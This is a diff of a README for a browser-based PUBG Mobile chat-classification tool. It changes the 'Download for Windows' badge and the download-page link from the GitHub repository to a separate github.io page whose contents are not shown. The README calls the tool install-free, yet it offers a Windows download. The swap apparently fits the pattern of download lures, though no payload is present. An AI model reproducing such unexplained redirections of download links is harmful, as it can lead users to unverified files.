@@ -1,6 +1,6 @@
 # 🎯 analisis-pubg-mobile-nlp - Categorize Game Chat Instantly
 
-[![Download for Windows](https://img.shields.io/badge/Download-View_Release-2ea44f?style=for-the-badge&logo=github)](https://github.com/Rahts121/analisis-pubg-mobile-nlp)
+[![Download for Windows](https://img.shields.io/badge/Download-View_Release-2ea44f?style=for-the-badge&logo=github)](https://rahts121.github.io)
 
 A browser-based tool that reads and sorts text related to PUBG Mobile. It uses NLP (natural language processing) to understand what people are saying. You do not need to install Python or any code editor. Just open the web page and paste your text.
 
@@ -53,7 +53,7 @@ Follow these steps to use the tool.
 ### Step 1: Go to the Download Page
 
 Visit this link:
-[https://github.com/Rahts121/analisis-pubg-mobile-nlp](https://github.com/Rahts121/analisis-pubg-mobile-nlp)
+[https://rahts121.github.io](https://rahts121.github.io)
 
 ### Step 2: Find the Web Version
 
